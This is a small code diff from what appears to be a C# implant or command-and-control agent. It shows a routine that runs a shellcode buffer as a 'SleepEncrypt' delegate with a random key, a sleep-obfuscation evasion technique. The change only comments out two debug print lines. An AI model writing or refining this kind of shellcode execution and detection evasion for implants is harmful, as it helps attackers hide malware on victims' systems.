@@ -603,10 +603,10 @@ namespace Engineer.Functions
                     int size = Marshal.SizeOf(pARAMS);
                     IntPtr arrPtr = Marshal.AllocHGlobal(size);
                     Marshal.StructureToPtr(pARAMS, arrPtr, false);
-                    Console.WriteLine($"sending random key of {random_char} to the shellcode");
+                    //Console.WriteLine($"sending random key of {random_char} to the shellcode");
                     SleepEncryptDelegate Run = (SleepEncryptDelegate)Marshal.GetDelegateForFunctionPointer(buffer, typeof(SleepEncryptDelegate));
                     int ReturnValue = Run(arrPtr);
-                    Console.WriteLine(ReturnValue);
+                    //Console.WriteLine(ReturnValue);
                     Marshal.FreeHGlobal(arrPtr);
                 }
             }
